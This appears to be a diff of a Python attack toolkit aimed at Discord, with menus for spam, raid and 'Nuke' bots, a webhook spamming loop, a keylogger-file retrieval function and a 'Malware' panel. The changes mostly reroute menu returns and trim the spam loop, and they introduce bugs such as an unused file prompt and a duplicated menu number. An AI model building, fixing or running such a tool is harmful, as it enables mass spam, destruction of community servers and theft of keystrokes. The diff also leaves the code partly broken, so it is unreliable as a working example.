@@ -71,7 +71,7 @@ Client.login("token")
     sleep(0.5)
     os.remove("Spam.js")
     clear()
-    botpanel()
+    mainpanel()
 
 
 #raid bot
@@ -113,7 +113,7 @@ Client.login("token")
   sleep(0.5)
   os.remove("Raid.js")
   clear()
-  botpanel()
+  mainpanel()
 
 
 
@@ -155,7 +155,7 @@ Client.login("token")
     sleep(0.5)
     os.remove("Nuke.js")
     clear()
-    botpanel()
+    mainpanel()
 
 
 #webhook spam
@@ -174,19 +174,11 @@ def webhookspam():
             
 
     for i in range(howmany):
-        if file != "":
-            try:
-                fichier_send = dhooks.File(file)
-                webhook.send(content=message, file=fichier_send)
-            except:
-                print("File doesn't exist.")
-                webhookspam()
-        else:
-            webhook.send(message)
+        webhook.send(message)
         sleep(delay/1000)
         print(f"Spam N°{i} sent")
-        clear()
-        webhookpanel()
+    clear()
+    mainpanel()
 
 
 #webhooks infos
@@ -204,7 +196,7 @@ def webhookinfos():
     Channel ID : {webhook.get_info().channel_id}""")
     input("Press enter to finish...")
     clear()
-    webhookpanel()
+    mainpanel()
 
 
 #delete webhook
@@ -220,7 +212,7 @@ def webhookdelete():
     except:
         pass
     clear()
-    webhookpanel()
+    mainpanel()
 
 
 
@@ -231,10 +223,12 @@ def webhookmessage():
         webhook = dhooks.Webhook(webhookurl)
     except:
         print("No internet or incorrect link.")
+        webhookspam()
     message = input("Message : ")
+    file = input("File directory : ")  
     webhook.send(message)
     clear()
-    webhookpanel()
+    mainpanel()
 
 
 #get keylogger file
@@ -363,7 +357,7 @@ while True:
   print("Done !")
   input("Press enter to finish...")
   clear()
-  malwarepanel()
+  mainpanel()
 
 
 
@@ -475,7 +469,7 @@ def webhookpanel():
 
                 {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Delete
 
-                {Fore.BLUE}[{Fore.GREEN}4{Fore.BLUE}] {Fore.RED}: Send message
+                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Send message
 
 
                 EXIT to return to the main panel
@@ -509,7 +503,6 @@ def webhookpanel():
 
 def mainpanel():
     print(f"""{Fore.MAGENTA}
-
     .....                                          ..                                
  .H8888888h.  ~-.                                dF                                  
  888888888888x  `>    x.    .        u.    u.   '88bu.         .u    .               
@@ -529,7 +522,8 @@ X~     `?888888hx~  .@88k  z88u    x@88k u@88c. '*88888bu    .d88B :@8c        u
 
                {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Bot
 
-               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Malware                                                                      
+               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Malware   
+                                                                                  
                                                                                      
 """)
     mainmode = input(space(50)+"Mode = "+Fore.RESET)
